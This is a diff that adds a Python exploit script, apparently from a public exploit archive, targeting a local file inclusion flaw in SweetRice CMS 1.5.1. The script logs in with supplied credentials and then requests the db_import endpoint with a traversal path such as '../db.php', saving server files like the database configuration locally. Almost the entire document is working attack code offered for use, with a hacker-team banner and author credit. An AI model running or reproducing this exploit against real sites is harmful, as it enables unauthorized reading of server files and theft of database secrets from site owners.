@@ -1,0 +1,74 @@
+#/usr/bin/python
+#-*- Coding: utf-8 -*-
+# Exploit Title: SweetRice 1.5.1 - Local File Inclusion
+# Exploit Author: Ashiyane Digital Security Team
+# Date: 03-11-2016
+# Vendor: http://www.basic-cms.org/
+# Software Link: http://www.basic-cms.org/attachment/sweetrice-1.5.1.zip
+# Version: 1.5.1
+# Platform: WebApp - PHP - Mysql
+
+import requests
+import os
+from requests import session
+
+if os.name == 'nt':
+    os.system('cls')
+else:
+    os.system('clear')
+    pass
+banner = '''
++-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
+|  _________                      __ __________.__                    |
+| /   _____/_  _  __ ____   _____/  |\______   \__| ____  ____      |
+| \_____  \\ \/ \/ // __ \_/ __ \   __\       _/  |/ ___\/ __ \     |
+| /        \\     /\  ___/\  ___/|  | |    |   \  \  \__\  ___/     |
+|/_______  / \/\_/  \___  >\___  >__| |____|_  /__|\___  >___  >    |
+|        \/             \/     \/            \/        \/    \/     |                                                    
+|    > SweetRice 1.5.1 Local File Inclusion                            |
+|    > Script Cod3r : Ehsan Hosseini                                    |
++-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-+
+'''
+
+print(banner)
+
+
+# Get Host & User & Pass & LfiPath
+host = input("Enter The Target URL(Example : localhost.com) : ")
+username = input("Enter Username : ")
+password = input("Enter Password : ")
+lfipath = input("Enter File To Download(Example : ../db.php) : ")
+xplfile = input("Enter Name of File To Save(Example : ../db.php) : ")
+
+userinfo = {
+    'user':username,
+    'passwd':password,
+    'rememberMe':''
+}
+
+with session() as r:
+    login = r.post('http://' + host + '/as/?type=signin', data=userinfo)
+    success = 'Login success'
+    if login.status_code == 200:
+        print("[+] Sending User&Pass...")
+        if login.text.find(success) > 1:
+            print("[+] Login Succssfully...")
+        else:
+            print("[-] User or Pass is incorrent...")
+            print("Good Bye...")
+            exit()
+            pass
+        pass
+    dlfile = r.get('http://' + host + '/as/?type=data&mode=db_import&db_file=' + lfipath + '&form_mode=save')
+
+    if dlfile.status_code == 200:
+
+        print('[+] Exploit...')
+        file = open(xplfile, "w")
+        file.write(dlfile.text)
+        file.close()
+        print('[+] File Saved...')
+        print('[+] Exploit By Ehsan Hosseini')
+    else:
+        print("[-] Error in Exploting...")
+        pass  
